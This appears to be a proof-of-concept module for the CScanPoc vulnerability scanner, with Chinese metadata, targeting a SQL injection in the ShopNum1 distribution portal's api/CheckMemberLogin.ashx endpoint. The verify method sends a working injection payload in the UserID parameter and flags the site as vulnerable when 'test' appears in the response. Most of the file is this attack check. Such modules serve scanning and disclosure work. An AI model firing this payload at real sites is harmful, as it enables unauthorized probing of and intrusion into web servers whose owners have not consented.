# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'ShopNum1_0000'  # 平台漏洞编号，留空
    name = 'ShopNum1分销门户系统 api/CheckMemberLogin.ashx注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-01-24'  # 漏洞公布时间
    desc = '''
        ShopNum1网店系统是武汉群翔软件有限公司自主研发的基于 WEB 应用的 B/S 架构的B2C网上商店系统，主要面向中高端客户， 为企业和大中型网商打造优秀的电子商务平台，ShopNum1运行于微软公司的 .NET 平台，采用最新的 ASP.NET 3.5技术进行分层开发。拥有更强的安全性、稳定性、易用性。
        ShopNum1分销门户系统 api/CheckMemberLogin.ashx注入。
    '''  # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=0146994'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ShopNum1'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '9070bef3-e972-4125-9323-4d973a9ff97d'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            arg = '{target}'.format(target=self.target)
            payload = "/api/CheckMemberLogin.ashx?UserID=0'%20and%20(CHAR(116)%2bCHAR(101)%2bCHAR(115)%2bCHAR(116))>0--&type=UserIsExist"
            target = arg + payload
            code, head, res, errcode, _ = hh.http(target)
            if code == 200 and "test" in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
